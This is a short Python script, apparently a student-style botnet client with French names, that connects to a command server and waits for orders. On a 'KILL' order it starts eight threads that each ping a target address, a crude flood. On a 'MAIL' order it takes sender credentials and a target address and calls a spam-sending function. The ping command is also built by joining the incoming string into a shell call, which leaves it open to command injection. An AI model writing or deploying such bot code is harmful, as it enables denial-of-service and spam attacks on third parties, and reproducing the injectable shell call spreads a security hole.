import socket
import os
from threading import Thread
import threading
from Email import envoyer_email

def thread_ping(ip):
    os.system("ping " + ip)

def thread_recevoir(client_socket):
    while True:
        response = client.recv(1024)
        reponseDecode = response.decode("utf-8")
        print(reponseDecode)
        if ordre in reponseDecode:
            adresseIP = reponseDecode[5:]
            print(adresseIP)
            for i in range(8):
                ping = threading.Thread(target=thread_ping, args={adresseIP, })
                ping.start()

        elif ordre2 in reponseDecode:
            reponseDecode = reponseDecode[5:]
            emailDuSpammer = reponseDecode[:reponseDecode.find(" ")]
            reponseDecode = reponseDecode[reponseDecode.find(" ") + 1:]
            motPasse = reponseDecode[:reponseDecode.find(" ")]
            reponseDecode = reponseDecode[reponseDecode.find(" ") + 1:]
            emailCible = reponseDecode

            envoyer_email(emailDuSpammer, motPasse, emailCible)

def thread_ecrire():
    while True:
        texte = input()
        client.send(str.encode(texte))

ordre = 'KILL '
ordre2 = 'MAIL '

serveurIP = "192.168.60.7"
serveurPort = 9999


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((serveurIP, serveurPort))

recevoir = threading.Thread(target=thread_recevoir, args={client, })
recevoir.start()

ecrire = Thread(target=thread_ecrire)
ecrire.start()
